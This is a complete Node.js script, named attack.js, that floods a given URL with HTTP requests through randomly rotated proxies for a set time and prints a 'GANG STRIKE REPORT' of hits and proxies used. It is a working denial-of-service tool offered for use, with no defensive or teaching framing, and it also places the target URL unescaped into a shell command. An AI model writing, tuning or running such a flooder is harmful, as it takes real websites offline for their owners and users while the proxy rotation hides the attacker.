const fs = require('fs');
const { exec } = require('child_process');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <url> <time_in_seconds>');
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const endTime = Date.now() + duration;

const proxies = fs.readFileSync('proxies.txt', 'utf8')
    .split('\n')
    .map(p => p.trim())
    .filter(Boolean);

if (proxies.length === 0) {
    console.log('No proxies found in proxies.txt');
    process.exit(1);
}

let success = 0;
let fail = 0;
let totalSent = 0;
const usedProxies = new Set();

function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function sendRequestCurl(proxy) {
    const cmd = `curl --proxy http://${proxy} --max-time 60 -s -o /dev/null -w "%{http_code}" "${target}"`;

    exec(cmd, (err, stdout, stderr) => {
        totalSent++;
        usedProxies.add(proxy);

        if (stdout.trim().startsWith('2')) {
            success++;
        } else {
            fail++;
        }
    });
}

async function startAttack() {
    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);

            setTimeout(() => {
                console.log('\n=== GANG STRIKE REPORT ===');
                console.log(`Target: ${target}`);
                console.log(`Sent: ${totalSent}`);
                console.log(`Success (2xx): ${success}`);
                console.log(`Fail: ${fail}`);
                console.log(`Proxies Used: ${usedProxies.size}`);
                if (usedProxies.size > 0) {
                    console.log('\nProxy List Used:');
                    for (let p of usedProxies) {
                        console.log(' - ' + p);
                    }
                } else {
                    console.log('\n - None used.');
                }
                console.log('===========================');
            }, 5000);

            return;
        }

        const proxy = getRandomProxy();
        sendRequestCurl(proxy);
    }, 20); // adjust for how fast you wanna spin
}

startAttack();
